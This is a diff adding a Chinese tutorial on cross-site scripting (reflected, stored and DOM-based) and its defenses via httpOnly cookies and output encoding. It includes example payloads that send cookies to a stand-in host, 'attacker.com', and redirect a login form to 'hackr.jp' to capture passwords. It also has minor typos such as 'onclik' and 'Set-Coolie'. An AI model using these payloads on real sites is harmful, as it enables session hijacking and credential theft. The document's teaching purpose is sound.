@@ -1,0 +1,171 @@
+# xss
+举个栗子：  
+get_param_from_url是一个从地址栏获取参数的函数
+```html
+<div>
+  ${get_param_from_url(message)}
+</div>
+```
+之后我们访问：`http://xxxx.com?message=hello`
+此时页面会显示
+```html
+<div>
+  hello
+</div>
+```
+
+但如果我们这样访问`http://xxxx.com?message=<script>alert('hello')</script>`
+
+如果页面没做任何处理，则会导致页面alert一个文本hello
+```html
+<div>
+  <script>alert('hello')</script>
+</div>
+```
+
+当然，以上javascript代码中只有alert一段代码，实际上它可以是任何js代码。  
+
+这便是一段最简单的xss攻击，即反射型xss攻击。xss攻击还有其他种类，我们接下来逐个来分析。
+
+xss（cross-site scripting跨域脚本攻击），一般分为两类：
+* Reflected XSS（反射型的 XSS 攻击）
+* Stored XSS（存储型的 XSS 攻击）
+* DOM Based XSS
+
+## 反射型xss攻击
+这种类型的xss攻击是简单地把用户输入的数据“反射”给浏览器。此时黑客需要诱使用户“点击”一个恶意链接，才能成功。
+
+案例一：
+1. 用户登录某网站(www.myWeb.com)，产生认证token，存储在cookie中，如`set cookie: sessId=183dsjfk3498djncrueiw`
+1. 存在某页面`www.myWeb.com/somePage`，它会获取地址栏中的message参数
+1. 黑客通过一些途径让用户提交如下url，`www.myWeb.com/somePage?message=<script>var+i=new+Image;i.src="http://attacker.com/"%2bdocument.cookie</script>`
+1. somePage页面通过提取message执行了里面的script代码，也想攻击者的网站attacker.com发起请求，并将cookie带了过去
+1. 攻击者拿到了cookie，可以伪造用户发起恶意请求了。
+
+整个过程如图所示  
+![xss](../images/xss.jpeg)
+
+此时黑客插入的代码是：
+```javascript
+var i = new Image
+i.src = "http://attacker.com/" + document.cookie
+```
+等于向黑客的地址发起了一个请求，并且带上了用户自己的cookie
+
+案例二：  
+有个如下的页面  
+![xss](../images/xss-2.jpeg)
+表单的ID项从URL中获取ID参数填充到文本框中，这种也是隐含着跨站脚本攻击的漏洞。
+
+黑客可以事先准备好如下URL，并作为欺诈邮件或者web页面，诱导用户去点击
+```
+http://example.jp/login?ID="><script>var+f=document.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script><span+s="
+```
+
+用户打开链接后，没有发生什么变化，但是脚本已经在偷偷的运行了。这时用户在表单输入完ID和密码后，点击登录，便把数据提交到攻击者的网站（http://hackr.jp）
+
+## 存储型的xss攻击
+存储型的xss攻击会把用户输入的数据存储在服务器端，这种类型的xss就具备很强的稳定性了。
+
+这种情况大部分都出现在一些类似留言板或者编辑器上。例如黑客可以在留言区留下javascript的攻击脚本，脚本会最终上传到服务器端并保存下来，如果服务器端不做任何处理，那所有能看到这个留言的用户都将执行这段代码。
+
+看如下案例：
+1. 用户登录后，获得认证令牌于cookie中。
+1. 攻击者在留言区中嵌入js代码，代码功能为获取用户cookie中的令牌，并向攻击者的服务器发起请求。
+1. 用户浏览到攻击者的留言，攻击者的攻击代码被执行，令牌被攻击者获取到。
+1. 攻击者获取到令牌，代替用户发起请求，完成攻击。
+
+### 两种xss攻击类型的区别
+1. 首先反射型需要攻击者设计一个url，诱导用户去访问该地址，最终完成攻击
+1. 存储型则不需要，它只需要等待用户去浏览被攻破的页面或者功能即可，而这个页面通常会是用户经常访问的页面
+
+## DOM Based XSS
+这种攻击可以说就是是反射型xss，只不过它是利用了js可以操作dom的特点来进行攻击。
+
+```html
+<script>
+  function test() {
+    var str = document.getElementById("text").value;
+    document.getElementById("t").innerHTML = "<a href='" + str + "' >testLink</a>";
+  }
+</script>
+
+<div id="t"></div>
+<input type="text" id="text" value="" />
+<input type="button" id="s" value="write" onclick="test()"/>
+```
+![xss-3](../images/xss-3.jpeg)
+
+用户在文本框中输入本文，点击按钮后执行test方法，在页面中插入一个链接，地址为文本框中输入的值。
+
+这里便隐藏着xss攻击。我们可以设计这样一个内容
+```
+' onclik=alert(/xss/) //
+```
+其中单引号用于将href闭合，最后的注释符号//用于注释掉第二个单引号，中间插入了一个onclick事件。当点击按钮后，生成的链接被用户点击后，变回弹出alert对话框，显示xss。插入的数据如下所示：
+```html
+<a href="" onclick=alert(/xss/)//' >testLink</a>
+```
+
+# xss防御
+## httpOnly
+xss攻击有很多都是通过js脚本窃取用户的cookie来伪造用户进行攻击，通过设置`httpOnly=true`禁止js代码获取cookie。
+
+我们必须知道httpOnly只能解决xss后的cookie劫持攻击。
+
+在设置cookie时可以添加很多备选项
+```
+Set-Coolie: <name>=<value>[; <Max-Age>=<age>]
+[; expires=<date>][; domain=<domain_name>]
+[; path=<some_path>][; secure][; HttpOnly]
+```
+
+服务器端可以设置多个Cookie（多个key-value对），httpOnly可以选择性的加在任何Cookie值上。我们可以只在部分敏感的Cookie上添加HttpOnly
+
+## 编码
+网页在显示内容的时候，需要将内容进行编码。
+
+### 网站直接输出展示
+当网站需要直接输出用户输入的结果时，需要对内容进行HTMLEncode，其标准被ISO-8859-1，需要转化以下字符
+```
+& ---> &amp;
+< ---> &lt;
+> ---> &gt;
+" ---> &quot;
+' ---> &#x27;
+/ ---> &#x2F;
+```
+不过也不是每个人都会按照这个标准实现，例如js的库[escape-html](https://github.com/component/escape-html)在单引号`'`和斜杠`/`的编码就不一样
+
+```javascript
+const escape = require('escape-html')
+const html = '<script>alert("xss")</script>'
+escape(html)
+// &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+```
+
+### 提供给javascript来使用
+有时我们输出的内容需要提供给网页的javascript来使用，做到动态配置的作用
+```javascript
+var foo = '"hello"'
+
+console.log(`var foo = "${foo}";`)
+// var foo = ""hello""
+```
+
+这是我们需要将变量中的字符进行javascript encode，将所有非白名单字符转义为`\`形式，并且放在引号内部。
+
+阿里的 [egg](https://github.com/eggjs/egg/) 框架提供了一个`helper.sjs`的工具帮我们做到这一点，具体原码可到这里看 [sjs](https://github.com/eggjs/egg-security/blob/master/lib/helper/sjs.js)
+```javascript
+var foo = '"hello"'
+
+console.log(`var foo = "${foo}";`)
+// var foo = ""hello""
+
+var sjs = require('./sjs')
+sjs(`var foo = "${foo}";`)
+// var foo = "\\x22hello\\x22";
+```
+该库会将非数字、非字母进行转义成十六进制格式，并在前面加上`\\xx`。
+
+有时我们还需要处理json数据，json也容易被xss利用，也需要转义，egg也提供了`helper.sjon`做json encode。
